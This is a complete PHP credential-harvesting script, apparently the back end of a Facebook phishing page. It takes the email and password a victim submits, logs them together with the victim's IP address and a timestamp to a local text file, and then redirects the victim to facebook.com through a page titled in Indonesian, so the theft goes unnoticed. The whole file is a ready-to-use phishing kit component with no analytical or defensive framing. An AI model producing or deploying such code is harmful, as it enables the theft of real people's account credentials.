<?php
$file = "monstercyber.txt";
$username = $_POST['login_email'];
$password = $_POST['login_password'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "Username: ");
fwrite($handle, "$username");
fwrite($handle, "\n");
fwrite($handle, "Password: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "IP Address: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
echo '<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.org/tech/DTD/xhtml-mobile12.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
    <title>Mengalihkan halaman</title>
<meta http-equiv="Refresh" content="1; URL=http://facebook.com/"/>
</head><body>
</body>
</html>
';
?>
